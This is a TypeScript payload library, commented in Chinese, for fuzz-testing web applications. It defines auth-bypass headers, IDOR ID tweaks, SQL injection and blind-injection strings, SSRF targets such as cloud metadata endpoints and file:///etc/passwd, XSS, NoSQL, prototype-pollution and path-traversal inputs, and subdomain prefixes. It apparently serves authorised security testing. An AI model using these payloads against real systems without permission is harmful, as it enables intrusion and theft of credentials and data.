/**
 * Fuzz 测试载荷库
 */

export interface Payload {
  name: string;
  value: string;
  description: string;
}

/** 越权测试载荷 */
export const AUTH_BYPASS_HEADERS: Record<string, string>[] = [
  {}, // 无 Token
  { 'Authorization': 'Bearer invalid' },
  { 'Authorization': 'Bearer null' },
  { 'Authorization': 'Bearer undefined' },
  { 'Cookie': '' },
  { 'X-Forwarded-For': '127.0.0.1' },
  { 'X-Real-IP': '127.0.0.1' },
  { 'X-Originating-IP': '127.0.0.1' },
  { 'X-Remote-IP': '127.0.0.1' },
];

/** IDOR 测试：替换 ID 模式 */
export const IDOR_ID_REPLACEMENTS = [
  { pattern: /\/(\d+)/g, name: 'increment', replacer: (m: string, id: string) => m.replace(id, String(Number(id) + 1)) },
  { pattern: /\/(\d+)/g, name: 'decrement', replacer: (m: string, id: string) => m.replace(id, String(Math.max(1, Number(id) - 1))) },
  { pattern: /\/(\d+)/g, name: 'zero', replacer: (m: string) => m.replace(/\d+/, '0') },
];

/** SQL 注入载荷 */
export const SQL_INJECTION_PAYLOADS: Payload[] = [
  { name: 'basic_quote', value: "'", description: '单引号测试' },
  { name: 'basic_dquote', value: '"', description: '双引号测试' },
  { name: 'or_1=1', value: "' OR '1'='1", description: 'OR 注入' },
  { name: 'or_1=1_comment', value: "' OR 1=1--", description: 'OR 注入 + 注释' },
  { name: 'admin_bypass', value: "admin'--", description: '管理员绕过' },
  { name: 'union_select', value: "' UNION SELECT NULL--", description: 'UNION 注入' },
  { name: 'sleep', value: "' AND SLEEP(2)--", description: '时间盲注' },
  { name: 'benchmark', value: "' AND BENCHMARK(1000000,MD5('a'))--", description: 'MySQL 时间盲注' },
];

/** SSRF 载荷 */
export const SSRF_PAYLOADS: Payload[] = [
  { name: 'localhost', value: 'http://127.0.0.1', description: '本地回环' },
  { name: 'localhost_alt', value: 'http://localhost', description: 'localhost' },
  { name: 'internal_metadata', value: 'http://169.254.169.254/latest/meta-data/', description: 'AWS 元数据' },
  { name: 'internal_gcp', value: 'http://metadata.google.internal/computeMetadata/v1/', description: 'GCP 元数据' },
  { name: 'file_protocol', value: 'file:///etc/passwd', description: '文件协议' },
];

/** 参数注入载荷 */
export const PARAM_INJECTION_PAYLOADS: Payload[] = [
  { name: 'xss_basic', value: '<script>alert(1)</script>', description: 'XSS 基础' },
  { name: 'xss_img', value: '<img src=x onerror=alert(1)>', description: 'XSS img' },
  { name: 'nosql_inject', value: '{"$gt":""}', description: 'NoSQL 注入' },
  { name: 'prototype_pollution', value: '__proto__[admin]=true', description: '原型污染' },
  { name: 'mass_assignment', value: 'role=admin', description: 'Mass Assignment' },
  { name: 'overly_long', value: 'A'.repeat(5000), description: '超长字符串' },
  { name: 'negative_number', value: '-1', description: '负数测试' },
  { name: 'zero', value: '0', description: '零值测试' },
  { name: 'special_chars', value: '../../../etc/passwd', description: '路径遍历' },
];

/** 子域名列举载荷 */
export const SUBDOMAIN_PREFIXES = [
  'test', 'dev', 'staging', 'admin', 'api', 'legacy',
  'old', 'new', 'beta', 'alpha', 'uat', 'qa',
  'internal', 'sandbox', 'demo', 'preprod', 'stage'
];
